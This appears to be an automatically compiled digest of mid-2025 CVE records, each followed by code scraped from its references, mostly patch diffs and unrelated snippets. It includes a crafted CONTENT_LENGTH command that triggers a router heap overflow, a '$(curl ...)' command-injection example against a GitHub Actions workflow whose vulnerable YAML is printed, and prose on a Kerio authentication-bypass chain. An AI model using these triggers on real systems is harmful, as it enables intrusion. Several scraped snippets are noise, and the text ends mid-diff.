ModSecurity is an open source, cross platform web application firewall (WAF) engine for Apache, IIS and Nginx. In versions 2.9.8 to before 2.9.11, an empty XML tag can cause a segmentation fault. If SecParseXmlIntoArgs is set to On or OnlyArgs, and the request type is application/xml, and at least one XML tag is empty (eg <foo></foo>), then a segmentation fault occurs. This issue has been patched in version 2.9.11. A workaround involves setting SecParseXmlIntoArgs to Off.

References (2):
  1. https://github.com/owasp-modsecurity/ModSecurity/commit/ecd7b9736836eee391d25f35d5bd06a3ce35a45d
  2. https://github.com/owasp-modsecurity/ModSecurity/security/advisories/GHSA-gw9c-4wfm-vj3x

Attempting to extract code examples from references...

--- Code from https://github.com/owasp-modsecurity/ModSecurity/commit/ecd7b9736836eee391d25f35d5bd06a3ce35a45d ---
From ca99ccd23fd92c002a3901e890b4b6ea394f292b Mon Sep 17 00:00:00 2001
From: Ervin Hegedus <airween@gmail.com>
Date: Tue, 24 Jun 2025 21:12:26 +0200
Subject: [PATCH 1/6] Fix unexpected behavior if the XML tag is empty

---
 apache2/msc_xml.c | 6 +++---
 1 file changed, 3 insertions(+), 3 deletions(-)

diff --git a/apache2/msc_xml.c b/apache2/msc_xml.c
index 8b0fa766e4..74945a0870 100644
--- a/apache2/msc_xml.c
+++ b/apache2/msc_xml.c
@@ -85,14 +85,14 @@ static void msc_xml_on_end_elementns(
 
             arg->name = xml_parser_state->currpath;
             arg->name_len = strlen(arg->name);
-            arg->value = xml_parser_state->currval;
-            arg->value_len = strlen(xml_parser_state->currval);
+            arg->value = (xml_parser_state->currval == NULL) ? apr_pstrndup(msr->mp, "", 1) : xml_parser_state->currval;
+            arg->value_len = (xml_parser_state->currval == NULL) ? 0 : strlen(xml_parser_state->currval);
             arg->value_origin_len = arg->value_len;
             arg->origin = "XML";
 
             if (msr->txcfg->debuglog_level >= 9) {
                 msr_log(msr, 9, "Adding XML argument '%s' with value '%s'",
-                    xml_parser_state->currpath, xml_parser_state->currval);
+                    xml_parser_state->currpath, arg->value);
             }
 
             apr_table_addn(msr->arguments,

From 89d3ad38c5a964f760af240e3ace3467bb729a64 Mon Sep 17 00:00:00 2001
From: Ervin Hegedus <airween@gmail.com>
Date: Tue, 24 Jun 2025 21:34:12 +0200
Subject: [PATCH 2/6] Introduced a new variable to hold currval length

---
 apache2/msc_xml.c | 11 +++++++++--
 apache2/msc_xml.h |  1 +
 2 files changed, 10 insertions(+), 2 deletions(-)

diff --git a/apache2/msc_xml.c b/apache2/msc_xml.c
index 74945a0870..dfb622cd47 100644
--- a/apache2/msc_xml.c
+++ b/apache2/msc_xml.c
@@ -44,6 +44,7 @@ static void msc_xml_on_start_elementns(
     // this is necessary because if there is any text between the tags (new line, etc)
     // it will be added to the current value
     xml_parser_state->currval = NULL;
+    xml_parser_state->currpathbufflen = 0;
 
     // if there is an item before the current one we set that has a child
     if (xml_parser_state->depth > 1) {
@@ -73,7 +74,11 @@ static void msc_xml_on_end_elementns(
             if (msr->txcfg->debuglog_level >= 4) {
                 msr_log(msr, 4, "Skipping request argument, over limit (XML): name \"%s\", value \"%s\"",
                         log_escape_ex(msr->mp, xml_parser_state->currpath, strlen(xml_parser_state->currpath)),
-                        log_escape_ex(msr->mp, xml_parser_state->currval, strlen(xml_parser_state->currval)));
+                        log_escape_ex(msr->mp,
+                                      (xml_parser_state->currval == NULL ? apr_pstrndup(msr->mp, "", 1) : xml_parser_state->currval),
+                                      (xml_parser_state->currvalbufflen == 0 ? 1 : xml_parser_state->currvalbufflen)
+                                     )
+                        );
             }
             msr->msc_reqbody_error = 1;
             msr->xml->xml_error = apr_psprintf(msr->mp, "More than %ld ARGS (GET + XML)", msr->txcfg->arguments_limit);
@@ -86,7 +91,7 @@ static void msc_xml_on_end_elementns(
             arg->name = xml_parser_state->currpath;
             arg->name_len = strlen(arg->name);
             arg->value = (xml_parser_state->currval == NULL) ? apr_pstrndup(msr->mp, "", 1) : xml_parser_state->currval;
-            arg->value_len = (xml_parser_state->currval == NULL) ? 0 : strlen(xml_parser_state->currval);
+            arg->value_len = (xml_parser_state->currvalbufflen == 0) ? 1 : xml_parser_state->currvalbufflen;
             arg->value_origin_len = arg->value_len;
             arg->origin = "XML";
 
@@ -123,6 +128,7 @@ static void msc_xml_on_characters(void *ctx, const xmlChar *ch, int len) {
                                             ((xml_parser_state->currval != NULL) ? xml_parser_state->currval : ""),
                                             apr_pstrndup(msr->mp, (const char *)ch, len),
                                             NULL);
+    xml_parser_state->currvalbufflen += len;
     // check if the memory allocation was successful
     if (xml_parser_state->currval == NULL) {
         msr->xml->xml_error = apr_psprintf(msr->mp, "Failed to allocate memory for XML value.");
@@ -175,6 +181,7 @@ int xml_init(modsec_rec *msr, char **error_msg) {
         msr->xml->xml_parser_state->pathlen         = 4; // "xml\0"
         msr->xml->xml_parser_state->currpath        = apr_pstrdup(msr->mp, "xml");
         msr->xml->xml_parser_state->currval         = NULL;
+        msr->xml->xml_parser_state->currvalbufflen  = 0;
         msr->xml->xml_parser_state->currpathbufflen = 4;
         // initialize the stack with item of 10
         // this will store the information about nodes
diff --git a/apache2/msc_xml.h b/apache2/msc_xml.h
index 3d23c60db9..dd232fba4d 100644
--- a/apache2/msc_xml.h
+++ b/apache2/msc_xml.h
@@ -31,6 +31,7 @@ struct msc_xml_parser_state {
     char               * currpath;
     char               * currval;
     size_t               currpathbufflen;
+    size_t               currvalbufflen;
     apr_pool_t         * mp;
 };
 

From f9e81f2c78188b486dee6d76fd274d06e15d0a71 Mon Sep 17 00:00:00 2001
From: Ervin Hegedus <airween@gmail.com>
Date: Tue, 24 Jun 2025 22:02:00 +0200
Subject: [PATCH 3/6] Leave strlen() if not necesseraly; use own length storage

---
 apache2/msc_xml.c | 11 +++++++----
 1 file changed, 7 insertions(+), 4 deletions(-)

diff --git a/apache2/msc_xml.c b/apache2/msc_xml.c
index dfb622cd47..b964daad1d 100644
--- a/apache2/msc_xml.c
+++ b/apache2/msc_xml.c
@@ -36,6 +36,7 @@ static void msc_xml_on_start_elementns(
     xml_parser_state->pathlen += (taglen + 1);
     char *newpath = apr_pstrcat(msr->mp, xml_parser_state->currpath, ".", (char *)localname, NULL);
     xml_parser_state->currpath = newpath;
+    xml_parser_state->currpathbufflen += taglen;
 
     int *new_stack_item = (int *)apr_array_push(xml_parser_state->has_child_stack);
     *new_stack_item = 0;
@@ -44,7 +45,7 @@ static void msc_xml_on_start_elementns(
     // this is necessary because if there is any text between the tags (new line, etc)
     // it will be added to the current value
     xml_parser_state->currval = NULL;
-    xml_parser_state->currpathbufflen = 0;
+    xml_parser_state->currvalbufflen = 0;
 
     // if there is an item before the current one we set that has a child
     if (xml_parser_state->depth > 1) {
@@ -73,7 +74,7 @@ static void msc_xml_on_end_elementns(
         if (apr_table_elts(msr->arguments)->nelts >= msr->txcfg->arguments_limit) {
             if (msr->txcfg->debuglog_level >= 4) {
                 msr_log(msr, 4, "Skipping request argument, over limit (XML): name \"%s\", value \"%s\"",
-                        log_escape_ex(msr->mp, xml_parser_state->currpath, strlen(xml_parser_state->currpath)),
+                        log_escape_ex(msr->mp, xml_parser_state->currpath, xml_parser_state->currpathbufflen),
                         log_escape_ex(msr->mp,
                                       (xml_parser_state->currval == NULL ? apr_pstrndup(msr->mp, "", 1) : xml_parser_state->currval),
                                       (xml_parser_state->currvalbufflen == 0 ? 1 : xml_parser_state->currvalbufflen)
@@ -89,7 +90,7 @@ static void msc_xml_on_end_elementns(
             msc_arg * arg = (msc_arg *) apr_pcalloc(msr->mp, sizeof(msc_arg));
 
             arg->name = xml_parser_state->currpath;
-            arg->name_len = strlen(arg->name);
+            arg->name_len = xml_parser_state->currpathbufflen;
             arg->value = (xml_parser_state->currval == NULL) ? apr_pstrndup(msr->mp, "", 1) : xml_parser_state->currval;
             arg->value_len = (xml_parser_state->currvalbufflen == 0) ? 1 : xml_parser_state->currvalbufflen;
             arg->value_origin_len = arg->value_len;
@@ -111,9 +112,11 @@ static void msc_xml_on_end_elementns(
     // -1 is needed because we don't need the last '.'
     char * newpath = apr_pstrndup(msr->mp, xml_parser_state->currpath, xml_parser_state->pathlen - 1);
     xml_parser_state->currpath = newpath;
+    xml_parser_state->currpathbufflen = xml_parser_state->pathlen - 2; // -2 because of the '\0' and the last '.'
 
     xml_parser_state->depth--;
     xml_parser_state->currval = NULL;
+    xml_parser_state->currvalbufflen = 0;
 }
 
 static void msc_xml_on_characters(void *ctx, const xmlChar *ch, int len) {
@@ -180,9 +183,9 @@ int xml_init(modsec_rec *msr, char **error_msg) {
         msr->xml->xml_parser_state->depth           = 0;
         msr->xml->xml_parser_state->pathlen         = 4; // "xml\0"
         msr->xml->xml_parser_state->currpath        = apr_pstrdup(msr->mp, "xml");
+        msr->xml->xml_parser_state->currpathbufflen = 3; // "xml"
         msr->xml->xml_parser_state->currval         = NULL;
         msr->xml->xml_parser_state->currvalbufflen  = 0;
-        msr->xml->xml_parser_state->currpathbufflen = 4;
         // initialize the stack with item of 10
         // this will store the information about nodes
         // 10 is just an initial value, it can be automatically incremented

From 8cb7fc82fecd182369bcffd93ab81f48d9c0a18c Mon Sep 17 00:00:00 2001
From: Ervin Hegedus <airween@gmail.com>
Date: Tue, 24 Jun 2025 22:10:20 +0200
Subject: [PATCH 4/6] Set correct length of currpath

---
 apache2/msc_xml.c | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

diff --git a/apache2/msc_xml.c b/apache2/msc_xml.c
index b964daad1d..8f4056f59e 100644
--- a/apache2/msc_xml.c
+++ b/apache2/msc_xml.c
@@ -112,7 +112,7 @@ static void msc_xml_on_end_elementns(
     // -1 is needed because we don't need the last '.'
     char * newpath = apr_pstrndup(msr->mp, xml_parser_state->currpath, xml_parser_state->pathlen - 1);
     xml_parser_state->currpath = newpath;
-    xml_parser_state->currpathbufflen = xml_parser_state->pathlen - 2; // -2 because of the '\0' and the last '.'
+    xml_parser_state->currpathbufflen = xml_parser_state->pathlen - 1;
 
     xml_parser_state->depth--;
     xml_parser_state->currval = NULL;

From e56d62960eee41e4ed92c8acafe5cad80047601a Mon Sep 17 00:00:00 2001
From: Ervin Hegedus <airween@gmail.com>
Date: Thu, 26 Jun 2025 17:42:49 +0200
Subject: [PATCH 5/6] Set correct pathlen

---
 apache2/msc_xml.c | 4 ++--
 1 file changed, 2 insertions(+), 2 deletions(-)

diff --git a/apache2/msc_xml.c b/apache2/msc_xml.c
index 8f4056f59e..8df3280be6 100644
--- a/apache2/msc_xml.c
+++ b/apache2/msc_xml.c
@@ -36,7 +36,7 @@ static void msc_xml_on_start_elementns(
     xml_parser_state->pathlen += (taglen + 1);
     char *newpath = apr_pstrcat(msr->mp, xml_parser_state->currpath, ".", (char *)localname, NULL);
     xml_parser_state->currpath = newpath;
-    xml_parser_state->currpathbufflen += taglen;
+    xml_parser_state->currpathbufflen += taglen + 1;
 
     int *new_stack_item = (int *)apr_array_push(xml_parser_state->has_child_stack);
     *new_stack_item = 0;
@@ -98,7 +98,7 @@ static void msc_xml_on_end_elementns(
 
             if (msr->txcfg->debuglog_level >= 9) {
                 msr_log(msr, 9, "Adding XML argument '%s' with value '%s'",
-                    xml_parser_state->currpath, arg->value);
+                    arg->name, arg->value);
             }
 
             apr_table_addn(msr->arguments,

From 8879413abf507b1921f6feb292ee91e0f0064b01 Mon Sep 17 00:00:00 2001
From: Ervin Hegedus <airween@gmail.com>
Date: Thu, 26 Jun 2025 21:50:54 +0200
Subject: [PATCH 6/6] Add comment to explain the behavior

---
 apache2/msc_xml.c | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

diff --git a/apache2/msc_xml.c b/apache2/msc_xml.c
index 8df3280be6..1deac6fc4d 100644
--- a/apache2/msc_xml.c
+++ b/apache2/msc_xml.c
@@ -36,7 +36,7 @@ static void msc_xml_on_start_elementns(
     xml_parser_state->pathlen += (taglen + 1);
     char *newpath = apr_pstrcat(msr->mp, xml_parser_state->currpath, ".", (char *)localname, NULL);
     xml_parser_state->currpath = newpath;
-    xml_parser_state->currpathbufflen += taglen + 1;
+    xml_parser_state->currpathbufflen += taglen + 1; // +1 for the '.' character here too
 
     int *new_stack_item = (int *)apr_array_push(xml_parser_state->has_child_stack);
     *new_stack_item = 0;


================================================================================


CVE ID: CVE-2025-45029
Published: 2025-07-02T14:15:25.470
Modified: 2025-07-03T15:13:53.147
CVSS Score: 6.5 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N

CWE Categories:
  - CWE-122: CWE-122

Description:
WINSTAR WN572HP3 v230525 was discovered to contain a heap overflow via the CONTENT_LENGTH variable at /cgi-bin/upload.cgi.

References (3):
  1. http://winstar.com
  2. http://wn572hp3.com
  3. https://yiweibu.github.io/2025/03/19/WINSTAR_WN572HP3/

Attempting to extract code examples from references...

--- Code from https://yiweibu.github.io/2025/03/19/WINSTAR_WN572HP3/ ---
<span class="line">1</span><br>

<span class="line">sudo chroot . ./qemu-mipsel-static -g 1234 -E HTTP_COOKIE=token=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa -E CONTENT_LENGTH=2147483632 ./etc/lighttpd/www/cgi-bin/upload.cgi</span><br>

================================================================================


CVE ID: CVE-2025-34071
Published: 2025-07-02T14:15:24.667
Modified: 2025-09-17T13:41:43.400
CVSS Score: 9.8 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-306: Missing Authentication for Critical Function

Description:
A remote code execution vulnerability in GFI Kerio Control 9.4.5 allows attackers with administrative access to upload and execute arbitrary code through the firmware upgrade feature. The system upgrade mechanism accepts unsigned .img files, which can be modified to include malicious scripts within the upgrade.sh or disk image components. These modified upgrade images are not validated for authenticity or integrity, and are executed by the system post-upload, enabling root access.

References (2):
  1. https://ssd-disclosure.com/ssd-advisory-kerio-control-authentication-bypass-and-rce/ [Exploit, Third Party Advisory]
  2. https://vulncheck.com/advisories/gfi-kerio-control-auth-bypass-rce [Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://ssd-disclosure.com/ssd-advisory-kerio-control-authentication-bypass-and-rce/ ---
GFIAgent

GFIAgent

9.4.3

================================================================================


CVE ID: CVE-2025-34070
Published: 2025-07-02T14:15:24.527
Modified: 2025-09-17T13:56:58.470
CVSS Score: 9.8 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-306: Missing Authentication for Critical Function

Description:
A missing authentication vulnerability in the GFIAgent component of GFI Kerio Control 9.4.5 allows unauthenticated remote attackers to perform privileged operations. The GFIAgent service, responsible for integration with GFI AppManager, exposes HTTP services on ports 7995 and 7996 without proper authentication. The /proxy handler on port 7996 allows arbitrary forwarding to administrative endpoints when provided with an Appliance UUID, which itself can be retrieved from port 7995. This results in a complete authentication bypass, permitting access to sensitive administrative APIs.

References (2):
  1. https://ssd-disclosure.com/ssd-advisory-kerio-control-authentication-bypass-and-rce/ [Exploit, Third Party Advisory]
  2. https://vulncheck.com/advisories/gfi-kerio-control-auth-bypass-rce [Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://ssd-disclosure.com/ssd-advisory-kerio-control-authentication-bypass-and-rce/ ---
GFIAgent

GFIAgent

9.4.3

================================================================================


CVE ID: CVE-2025-34069
Published: 2025-07-02T14:15:24.390
Modified: 2025-09-17T14:01:51.437
CVSS Score: 9.8 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-306: Missing Authentication for Critical Function

Description:
An authentication bypass vulnerability exists in GFI Kerio Control 9.4.5 due to insecure default proxy configuration and weak access control in the GFIAgent service. The non-transparent proxy on TCP port 3128 can be used to forward unauthenticated requests to internal services such as GFIAgent, bypassing firewall restrictions and exposing internal management endpoints. This enables unauthenticated attackers to access the GFIAgent service on ports 7995 and 7996, retrieve the appliance UUID, and issue administrative requests via the proxy. Exploitation results in full administrative access to the Kerio Control appliance.

References (2):
  1. https://ssd-disclosure.com/ssd-advisory-kerio-control-authentication-bypass-and-rce/ [Exploit, Third Party Advisory]
  2. https://vulncheck.com/advisories/gfi-kerio-control-auth-bypass-rce [Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://ssd-disclosure.com/ssd-advisory-kerio-control-authentication-bypass-and-rce/ ---
GFIAgent

GFIAgent

9.4.3

================================================================================


CVE ID: CVE-2025-2330
Published: 2025-07-02T10:15:23.033
Modified: 2025-07-10T15:25:12.770
CVSS Score: 6.4 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
The All-in-One Addons for Elementor – WidgetKit plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the plugin's 'button+modal' widget in all versions up to, and including, 2.5.4 due to insufficient input sanitization and output escaping on user supplied attributes. This makes it possible for authenticated attackers, with contributor-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.

References (4):
  1. https://plugins.trac.wordpress.org/browser/widgetkit-for-elementor/trunk/elements/button-modal/template/view.php#L86 [Product]
  2. https://plugins.trac.wordpress.org/changeset/3283765/widgetkit-for-elementor/tags/2.5.5/elements/button-modal/template/view.php [Patch]
  3. https://wordpress.org/plugins/widgetkit-for-elementor/#developers [Product]
  4. https://www.wordfence.com/threat-intel/vulnerabilities/id/83d5337b-8c06-41ee-b18c-2c39150a7f30?source=cve [Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://wordpress.org/plugins/widgetkit-for-elementor/#developers ---
widgetkit-for-elementor.zip

/wp-content/plugins/

================================================================================


CVE ID: CVE-2024-13786
Published: 2025-07-02T07:15:22.857
Modified: 2025-07-03T15:13:53.147
CVSS Score: 9.8 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-502: Deserialization of Untrusted Data

Description:
The education theme for WordPress is vulnerable to PHP Object Injection in all versions up to, and including, 3.6.10 via deserialization of untrusted input in the 'themerex_callback_view_more_posts' function. This makes it possible for unauthenticated attackers to inject a PHP Object. No known POP chain is present in the vulnerable software, which means this vulnerability has no impact unless another plugin or theme containing a POP chain is installed on the site. If a POP chain is present via an additional plugin or theme installed on the target system, it may allow the attacker to perform actions like delete arbitrary files, retrieve sensitive data, or execute code depending on the POP chain present.

References (2):
  1. https://themeforest.net/item/education-center-training-courses-wordpress-theme/10652918#item-description__change-log
  2. https://www.wordfence.com/threat-intel/vulnerabilities/id/d0b27bc8-617a-4f98-954f-e49f87dca311?source=cve

Attempting to extract code examples from references...

--- Code from https://themeforest.net/item/education-center-training-courses-wordpress-theme/10652918#item-description__change-log ---
<code> - Compatibility with WordPress 6.8.1x has been improved; 
 - Theme styles have been improved

<code> - Compatibility with WordPress 6.7.1x has been improved; 
  - Social icons .png;
  - Theme styles have been improved;
  - PHP Object Injection vulnerability has been fixed;
  - All plugins have been updated to their latest versions 

<code> - Compatibility with WordPress 6.6.1x has been improved; 
 - elegro Crypto Payment plugin;
 - Theme styles have been improved

================================================================================


CVE ID: CVE-2025-6687
Published: 2025-07-02T04:16:01.167
Modified: 2025-07-08T13:46:45.833
CVSS Score: 6.4 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
The Magic Buttons for Elementor plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the plugin's magic-button shortcode in all versions up to, and including, 1.0 due to insufficient input sanitization and output escaping on user supplied attributes. This makes it possible for authenticated attackers, with contributor-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.

References (3):
  1. https://plugins.svn.wordpress.org/magic-buttons-for-elementor/trunk/magic_buttons_shortcodes.php [Product]
  2. https://wordpress.org/plugins/magic-buttons-for-elementor/#developers [Product]
  3. https://www.wordfence.com/threat-intel/vulnerabilities/id/25eb1c89-0121-4ea5-a29a-43ec98c468ee?source=cve [Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://wordpress.org/plugins/magic-buttons-for-elementor/#developers ---
magic-buttons-for-elementor

/wp-content/plugins/

================================================================================


CVE ID: CVE-2025-6686
Published: 2025-07-02T04:16:00.243
Modified: 2025-07-08T13:51:15.403
CVSS Score: 6.4 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
The Magic Buttons for Elementor plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the plugin's magic-button shortcode in all versions up to, and including, 1.0 due to insufficient input sanitization and output escaping on user supplied attributes. This makes it possible for authenticated attackers, with contributor-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.

References (2):
  1. https://wordpress.org/plugins/magic-buttons-for-elementor/#developers [Product]
  2. https://www.wordfence.com/threat-intel/vulnerabilities/id/4379f2c5-3533-45f7-a4ef-0b3320eb5d04?source=cve [Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://wordpress.org/plugins/magic-buttons-for-elementor/#developers ---
magic-buttons-for-elementor

/wp-content/plugins/

================================================================================


CVE ID: CVE-2025-52101
Published: 2025-07-01T21:15:25.533
Modified: 2025-07-03T15:14:12.767
CVSS Score: 9.8 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-284: CWE-284

Description:
linjiashop <=0.9 is vulnerable to Incorrect Access Control. When using the default-generated JWT authentication, attackers can bypass the authentication and retrieve the encrypted "password" and "salt". The password can then be obtained through brute-force cracking.

References (2):
  1. https://gist.github.com/NSW111/33824ceb4d1b920671124f77abfe27e8
  2. https://gitee.com/microapp/linjiashop

Attempting to extract code examples from references...

--- Code from https://gitee.com/microapp/linjiashop ---
    CREATE DATABASE IF NOT EXISTS linjiashop DEFAULT CHARSET utf8 COLLATE utf8_general_ci; 
    CREATE USER 'linjiashop'@'%' IDENTIFIED BY 'linjiaSHOP@191028';
    GRANT ALL privileges ON linjiashop.* TO 'linjiashop'@'%';
    flush privileges;
    

            ## 首次启动需要设置下列配置项设置为create，以便系统可以自动创建表并导入./import.sql测试数据文件
            ## 如果下面配置无法自动建表并导入测试数据文件；则可以手动初始化数据库，手动使用的初始化文件文件位于：doc/database.sql
            spring.jpa.hibernate.ddl-auto=create
            

================================================================================


CVE ID: CVE-2025-45006
Published: 2025-07-01T20:15:24.993
Modified: 2025-07-03T15:14:12.767
CVSS Score: 9.1 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H

CWE Categories:
  - CWE-266: CWE-266

Description:
Improper mstatus.SUM bit retention (non-zero) in Open-Source RISC-V Processor commit f517abb violates privileged spec constraints, enabling potential physical memory access attacks.

References (3):
  1. https://github.com/chipsalliance/rocket-chip.git
  2. https://github.com/heyfenny/Vulnerability_disclosure/blob/main/RISCV/Rocket-chip/CVE-2025-45006/details.md
  3. https://lf-riscv.atlassian.net/wiki/spaces/HOME/pages/16154769/RISC-V+Technical+Specifications#ISA-Specifications

Attempting to extract code examples from references...

--- Code from https://github.com/chipsalliance/rocket-chip.git ---
$ git clone https://github.com/ucb-bar/rocket-chip.git
$ cd rocket-chip
$ git submodule update --init


$ make verilog


$ make verilog CONFIG=DefaultSmallConfig


================================================================================


CVE ID: CVE-2025-6600
Published: 2025-07-01T19:15:28.003
Modified: 2025-09-05T14:59:47.533
CVSS Score: 4.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N

CWE Categories:
  - CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

Description:
An exposure of sensitive information vulnerability was identified in GitHub Enterprise Server that could allow an attacker to disclose the names of private repositories within an organization. This issue could be exploited by leveraging a user-to-server token with no scopes via the Search API endpoint. Successful exploitation required an organization administrator to install a malicious GitHub App in the organization’s repositories. This vulnerability impacted only GitHub Enterprise Server version 3.17 and was addressed in version 3.17.2. The vulnerability was reported through the GitHub Bug Bounty program.

References (1):
  1. https://docs.github.com/en/enterprise-server@3.17/admin/release-notes#3.17.2 [Release Notes]

Attempting to extract code examples from references...

--- Code from https://docs.github.com/en/enterprise-server@3.17/admin/release-notes#3.17.2 ---
chronyd

ghe-config-check

ghe-config-apply

================================================================================


CVE ID: CVE-2025-53104
Published: 2025-07-01T19:15:27.800
Modified: 2025-07-03T15:14:12.767
CVSS Score: 9.1 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

CWE Categories:
  - CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')

Description:
gluestack-ui is a library of copy-pasteable components & patterns crafted with Tailwind CSS (NativeWind). Prior to commit e6b4271, a command injection vulnerability was discovered in the discussion-to-slack.yml GitHub Actions workflow. Untrusted discussion fields (title, body, etc.) were directly interpolated into shell commands in a run: block. An attacker could craft a malicious GitHub Discussion title or body (e.g., $(curl ...)) to execute arbitrary shell commands on the Actions runner. This issue has been fixed in commit e6b4271 where the discussion-to-slack.yml workflow was removed. Users should remove the discussion-to-slack.yml workflow if using a fork or derivative of this repository.

References (2):
  1. https://github.com/gluestack/gluestack-ui/commit/e6b427150b35e97a089ea10409de8c5c52f8a7b9
  2. https://github.com/gluestack/gluestack-ui/security/advisories/GHSA-432r-9455-7f9x

Attempting to extract code examples from references...

--- Code from https://github.com/gluestack/gluestack-ui/commit/e6b427150b35e97a089ea10409de8c5c52f8a7b9 ---
From e6b427150b35e97a089ea10409de8c5c52f8a7b9 Mon Sep 17 00:00:00 2001
From: Sanket Sahu <sanket@geekyants.com>
Date: Fri, 13 Jun 2025 12:28:08 +0530
Subject: [PATCH] Emptied discussion-to-slack.yml

---
 .github/workflows/discussion-to-slack.yml | 39 -----------------------
 1 file changed, 39 deletions(-)

diff --git a/.github/workflows/discussion-to-slack.yml b/.github/workflows/discussion-to-slack.yml
index c175487107..8b13789179 100644
--- a/.github/workflows/discussion-to-slack.yml
+++ b/.github/workflows/discussion-to-slack.yml
@@ -1,40 +1 @@
-name: Discussion to Slack Notification
 
-on:
-  discussion:
-    types: [created]
-
-jobs:
-  notify-slack:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout code
-        uses: actions/checkout@v3
-
-      - name: Get discussion details
-        id: discussion-details
-        run: |
-          echo "title=${{ github.event.discussion.title }}" >> $GITHUB_OUTPUT
-          echo "body=${{ github.event.discussion.body }}" >> $GITHUB_OUTPUT
-          echo "url=${{ github.event.discussion.html_url }}" >> $GITHUB_OUTPUT
-          echo "author=${{ github.event.discussion.user.login }}" >> $GITHUB_OUTPUT
-          echo "category=${{ github.event.discussion.category.name }}" >> $GITHUB_OUTPUT
-
-      - name: Post to Slack channel
-        id: slack
-        uses: slackapi/slack-github-action@v1.23.0
-        with:
-          channel-id: ${{ secrets.SLACK_CHANNEL_ID }}
-          slack-message: |
-            :speech_balloon: New Discussion Created :speech_balloon:
-            *Title:* ${{ steps.discussion-details.outputs.title }}
-            *Author:* ${{ steps.discussion-details.outputs.author }}
-            *Category:* ${{ steps.discussion-details.outputs.category }}
-            *Link:* ${{ steps.discussion-details.outputs.url }}
-
-            *Discussion Body:*
-            ```
-            ${{ steps.discussion-details.outputs.body }}
-            ```
-        env:
-          SLACK_BOT_TOKEN: ${{ secrets.SLACK_BOT_TOKEN }}


================================================================================


CVE ID: CVE-2025-48379
Published: 2025-07-01T19:15:27.353
Modified: 2025-07-03T15:14:12.767
CVSS Score: 7.1 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H

CWE Categories:
  - CWE-122: CWE-122

Description:
Pillow is a Python imaging library. In versions 11.2.0 to before 11.3.0, there is a heap buffer overflow when writing a sufficiently large (>64k encoded with default settings) image in the DDS format due to writing into a buffer without checking for available space. This only affects users who save untrusted data as a compressed DDS image. This issue has been patched in version 11.3.0.

References (4):
  1. https://github.com/python-pillow/Pillow/commit/ef98b3510e3e4f14b547762764813d7e5ca3c5a4
  2. https://github.com/python-pillow/Pillow/pull/9041
  3. https://github.com/python-pillow/Pillow/releases/tag/11.3.0
  4. https://github.com/python-pillow/Pillow/security/advisories/GHSA-xg8h-j46f-w952

Attempting to extract code examples from references...

--- Code from https://github.com/python-pillow/Pillow/commit/ef98b3510e3e4f14b547762764813d7e5ca3c5a4 ---
From ef98b3510e3e4f14b547762764813d7e5ca3c5a4 Mon Sep 17 00:00:00 2001
From: Andrew Murray <3112309+radarhere@users.noreply.github.com>
Date: Sat, 28 Jun 2025 00:29:58 +1000
Subject: [PATCH] Fix buffer overflow when saving compressed DDS images (#9041)

Co-authored-by: Eric Soroos <eric-github@soroos.net>
---
 Tests/test_file_dds.py     | 17 +++++++++++++++++
 src/libImaging/BcnEncode.c |  4 ++++
 2 files changed, 21 insertions(+)

diff --git a/Tests/test_file_dds.py b/Tests/test_file_dds.py
index 3388fce164e..5c7a943b1b7 100644
--- a/Tests/test_file_dds.py
+++ b/Tests/test_file_dds.py
@@ -511,3 +511,20 @@ def test_save_dx10_bc5(tmp_path: Path) -> None:
     im = hopper("L")
